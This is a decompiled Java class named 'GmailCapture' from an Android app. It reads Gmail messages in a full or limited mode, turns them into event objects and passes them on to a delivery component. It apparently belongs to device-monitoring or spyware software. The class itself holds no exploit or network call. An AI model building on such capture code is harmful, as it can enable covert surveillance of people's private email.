package com.vvt.capture.email.gmail;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.email.a.d;
import com.vvt.capture.email.c;
import com.vvt.io.m;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private com.vvt.base.a d;
  private com.vvt.base.capture.e e;
  private f f;
  private d g;
  private String h;
  
  public a(String paramString1, com.vvt.base.a parama, RunningMode paramRunningMode, Context paramContext, com.vvt.n.a.b paramb, m paramm, String paramString2)
  {
    Object localObject1 = new com/vvt/capture/email/a/a;
    ((com.vvt.capture.email.a.a)localObject1).<init>();
    localObject1 = ((com.vvt.capture.email.a.a)localObject1).a(paramContext, paramRunningMode);
    this.g = ((d)localObject1);
    this.h = paramString1;
    this.d = parama;
    localObject1 = RunningMode.FULL;
    boolean bool;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      bool = a;
      if (bool) {}
      localObject1 = new com/vvt/capture/email/gmail/b/a;
      ((com.vvt.capture.email.gmail.b.a)localObject1).<init>(paramm);
      this.e = ((com.vvt.base.capture.e)localObject1);
      localObject1 = new com/vvt/capture/email/gmail/b/e;
      localObject2 = this.h;
      ((com.vvt.capture.email.gmail.b.e)localObject1).<init>((String)localObject2);
      localObject2 = this.g;
      ((com.vvt.capture.email.gmail.b.e)localObject1).a((d)localObject2);
      ((com.vvt.capture.email.gmail.b.e)localObject1).a(paramString2);
      this.f = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject1)
      {
        bool = a;
        if (bool) {}
        localObject1 = new com/vvt/capture/email/gmail/a/a;
        localObject2 = this.h;
        ((com.vvt.capture.email.gmail.a.a)localObject1).<init>(paramb, (String)localObject2);
        this.e = ((com.vvt.base.capture.e)localObject1);
        localObject1 = new com/vvt/capture/email/gmail/a/b;
        ((com.vvt.capture.email.gmail.a.b)localObject1).<init>();
        ((com.vvt.capture.email.gmail.a.b)localObject1).a(paramString2);
        localObject2 = this.h;
        ((com.vvt.capture.email.gmail.a.b)localObject1).b((String)localObject2);
        localObject2 = this.g;
        ((com.vvt.capture.email.gmail.a.b)localObject1).a((d)localObject2);
        this.f = ((f)localObject1);
      }
      else
      {
        bool = c;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof GmailEventReference;
    if (bool) {
      paramg = (GmailEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/capture/email/gmail/GmailEventReference;
      paramg.<init>();
    }
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = b;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool3 = localObject instanceof c;
        if (bool3)
        {
          localObject = (c)localObject;
          d locald = this.g;
          localObject = com.vvt.capture.email.b.a((c)localObject, locald);
          localArrayList.add(localObject);
        }
      }
      Object localObject = this.d;
      if (localObject != null)
      {
        int i = localArrayList.size();
        if (i > 0)
        {
          boolean bool2 = k();
          if (bool2)
          {
            bool2 = b;
            if (bool2) {}
            localObject = this.d;
            ((com.vvt.base.a)localObject).a(localArrayList);
          }
        }
      }
    }
  }
  
  protected com.vvt.base.capture.e b()
  {
    return this.e;
  }
  
  protected f c()
  {
    return this.f;
  }
  
  protected String d()
  {
    return "GmailCapture";
  }
  
  protected String e()
  {
    return this.h;
  }
  
  protected String f()
  {
    return "gmail.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/gmail/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */